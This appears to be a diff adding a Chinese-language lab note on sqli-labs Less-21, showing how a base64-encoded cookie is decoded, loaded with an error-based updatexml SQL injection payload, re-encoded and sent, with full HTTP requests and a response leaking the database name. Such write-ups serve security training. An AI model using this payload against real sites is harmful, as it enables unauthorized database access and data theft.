@@ -1,0 +1,58 @@
+base64注入就是将编码的那部分进行解码然后带入SQL注入语句在进行编码，在带入查询
+类似于：
+GET /Less-21/index.php HTTP/1.1
+Host: 118.24.125.87:8000
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://118.24.125.87:8000/Less-21/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: uname=YWRtaW4=
+Connection: close
+
+Cookie的uname被base64编码了，解码为admin，带入注入语句
+admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1 
+编码后变成：YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE=
+带入cookie查询
+
+GET /Less-21/index.php HTTP/1.1
+Host: 118.24.125.87:8000
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://118.24.125.87:8000/Less-21/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: uname=YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE=
+Connection: close
+
+返回结果：
+HTTP/1.1 200 OK
+Date: Sat, 19 Jan 2019 01:22:15 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.13
+Vary: Accept-Encoding
+Content-Length: 1066
+Connection: close
+Content-Type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<title>Less-21 Cookie Injection- Error Based- complex - string</title>
+</head>
+
+<body bgcolor="#000000">
+
+
+
+
+
+ 
+<center><br><br><br><b><img src="../images/Less-21.jpg" /><br><br><b><br><font color= "red" font size="4">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</font><br><font color= "cyan" font size="4">YOUR IP ADDRESS IS : 14.120.127.179</font><br><font color= "#FFFF00" font size = 4 >DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br><font color= "orange" font size = 5 >YOUR COOKIE : uname = YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE= and expires: Sat 19 Jan 2019 - 02:22:15<br></font>Issue with your mysql: XPATH syntax error: '~security~'
+
